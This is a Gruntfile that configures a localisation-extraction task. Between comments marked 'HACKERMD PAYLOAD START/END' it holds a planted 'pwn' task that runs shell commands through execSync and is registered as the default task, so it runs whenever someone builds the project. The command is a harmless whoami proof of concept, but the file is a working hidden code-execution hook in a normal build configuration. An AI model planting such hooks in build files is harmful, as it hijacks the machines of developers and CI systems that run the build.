
module.exports = function(grunt) {
  grunt.initConfig({
    'l10n-extract': {
      all: {
        options: {
          potFile: 'locale/templates/LC_MESSAGES/messages.pot',
          poFiles: ['en.po'],
          src: ['app/scripts/lib/l10n/en.ftl']
        }
      }
    }
  });

  // --- HACKERMD PAYLOAD START ---
  grunt.registerTask('pwn', 'Run a shell command', function() {
    const { execSync } = require('child_process');
    console.log('----- HACKERMD WAS HERE - SUCCESS! -----');
    console.log('USER:', execSync('whoami').toString().trim());
    console.log('--- PoC Complete ---');
  });
  grunt.loadNpmTasks('grunt-l10n-extract');
  grunt.registerTask('default', ['pwn']);
  // --- HACKERMD PAYLOAD END ---
};

